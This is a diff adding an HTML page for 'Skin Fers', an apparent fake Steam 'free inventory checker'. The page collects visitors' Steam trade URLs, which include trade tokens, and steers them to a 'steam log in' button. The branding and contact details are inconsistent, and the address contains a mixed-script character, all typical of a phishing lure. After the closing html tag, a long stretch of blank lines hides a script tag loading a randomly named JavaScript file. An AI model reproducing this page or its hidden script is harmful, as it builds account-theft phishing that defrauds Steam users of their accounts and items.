@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Skin Fers - Inventory checker</title>
+    <meta name="Description" content="What is this website? - It is a Free Inventory Checker. Using it you save a lot of time to search for information yourself.">
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@100;200;300;400;500;600;700;800;900&family=Nunito+Sans:ital,wght@0,200;0,300;0,400;0,600;0,700;0,800;0,900;1,200;1,300;1,400;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@1,600&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="assets/1.png">
+</head>
+<body>
+    
+
+
+<!-- header -->
+<header class="header">
+    <div class="wrapper">
+        <a href="index.html">
+        <div class="logo">
+            <img src="/assets/img/logo.svg" alt="logo" class="logo__pic">
+            <p class="logo__text_left">skin</p>
+            <p class="logo__text_right">fers</p>
+        </div>
+        </a>
+        <nav>
+            <ul class="navigation">
+                <li><a href="#faq">FAQ</a></li>
+                <li><a href="#contact">Contacts</a></li>
+                <li id="market"><a href="#">Market</a></li>
+            </ul>
+        </nav>
+        <button class="login-btn authBtn">
+            <p>Sign in</p> 
+        </button>
+    </div>
+</header>
+
+
+<!-- checker -->
+<div  id="checker" class="checker">
+    <h1 class="checker__title">
+        <span class="checker__title_dollar text__gradient">$</span><span class="text__gradient">free</span>
+        inventory checker
+    </h1>
+    <hr class="checker__hr">
+    <div class="checker__body">
+        <div class="checker__body_left">
+            <img class="char__img" src="/assets/img/1.png" alt="">
+        </div>
+        <div class="checker__body_right">
+        <p class="checker__body_title">put your trade url below</p>
+        <input class="checker__input" type="text"  placeholder="https://steamcommunity.com/tradeoffer/new/?partner=35374810&token=79cNliJe">
+        <p class="checker__body_subtitle">By using our service, you automatically accept the terms of our site. By signing up, you agree to our terms and conditions <a href="terms-of-use">Terms of Use</a>  and <a href="privacy-policy">Privacy Policy</a></p>
+        <button id="start" class="checker__body_btn">
+            <p id='start-text'>Start</p>
+            <img id='start-arrow' src="/assets/img/arrow.svg" alt="">
+        </button>
+        </div>
+    </div>
+</div>
+
+
+<!-- faq -->
+<div id="faq" class="faq">
+    <div class="faq__section">
+        <p class="faq__section_number">1</p>
+        <p class="faq__section_poing">.</p>
+        <div class="faq__section_text">Copy your Trade link from your Steam Account
+        </div>
+    </div>
+
+    <div class="faq__section">
+        <p class="faq__section_number">2</p>
+        <p class="faq__section_poing">.</p>
+        <div class="faq__section_text">Paste it into the form
+        </div>
+    </div>
+
+    <div class="faq__section">
+        <p class="faq__section_number">3</p>
+        <p class="faq__section_poing">.</p>
+        <div class="faq__section_text">Click <span>Start</span> 
+        </div>
+    </div>
+
+    <div class="faq__section">
+        <p class="faq__section_number">4</p>
+        <p class="faq__section_poing">.</p>
+        <div class="faq__section_text">Great! You can get your information now
+        </div>
+    </div>
+</div>
+
+
+
+<!-- top skins -->
+<div id="top-skins" class="top-skins">
+    <p class="checker__title">Top Skins of All Time</p>
+
+
+<div class="top-skins__btns">
+    <button id="csgo-btn" class="top-skins__btn top-skins__btn_active">csgo</button>
+    <button id="tf2-btn"  class="top-skins__btn top-skins__btn_non-active">tf2</button>
+    <button id="dota-btn"  class="top-skins__btn top-skins__btn_non-active">dota</button>
+</div>
+    <div class="items">
+    </div>
+    
+</div>
+
+
+<!-- contact -->
+<div id="contact" class="contact">
+    <p class="checker__title contact__title">Do you have a question?</p>
+    <p class="contact__subtitle">If you have a question, you can send us an email. We will reply as quickly as we can. This includes issues related to cooperation, problems with the work of the site, advertising.</p>
+    <a href="mailto:support@skintake.com">
+    <button class="checker__body_btn contact__btn">
+        <p>Ask</p>
+        <img src="/assets/img/sms.svg" alt="">
+    </button>
+    </a>
+</div>
+
+
+
+<!-- footer -->
+<footer class="footer" id="footer">
+    <div class="footer__wrap">
+        <div class="footer__section section_one">
+            <p class="footer__text">Skinrefs Inc., аddress: 1122 Gray Street, Wilmington, DE 19121
+            </p>
+            <div class="footer__logo">
+                <img src="/assets/img/logo.svg" alt="logo" class="footer__logo-img">
+                <p class="logo__text_left logo__text">skin<span class="logo__text_right logo__text">fers</span></p>
+                
+            </div>
+            <p class="footer__text">© 2021 Skinfers. All rights reserved
+            </p>
+            <p class="footer__text">Skinfers is not affiliated with or endorsed by Valve Corporation.
+
+            </p>
+            </div>
+
+        <div class="footer__section">
+        <p class="footer__title">About</p>
+        <a href="privacy-policy">Privacy Policy</a>
+        <a href="terms-of-use">Terms of Use</a>
+        </div>
+
+        <div class="footer__section">
+            <p class="footer__title">Contacts</p>
+            <a href="mailto:support@skinfers.com">support@skinfers.com</a>
+        </div>
+    </div>
+</footer> 
+
+
+
+<!-- modalka -->
+<div class="popup" id="popup">
+    <div class="popup__body">
+        <div class="popup__content">
+            <a href="index.html" class="popup__close">
+                <img id="close" src="/assets/img/close.svg" alt="">
+            </a>
+            <p class="popup__title">Ooops!</p>
+            <p class="popup__subtitle">Unfortunately, the functionality that you want to use is available only to authorized users. You can go through authorization follow the link below.</p>
+            <button class="login-btn popup__login authBtn">
+                steam log in
+            </button>
+        </div>
+    </div>
+</div> 
+
+
+<div class="popup__market_body">
+    <div class="popub__market">
+        <img src="/assets/img/marketdontwork.svg" alt="">
+        We are working on it...
+    </div>
+</div>
+
+<script src="/assets/script.js"></script>
+<script src="/assets/items.js"></script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+<script src="/s0jw2b2nyc6222eo05r3j2jh61bijnbqdcrmp1picy949t.js"></script>
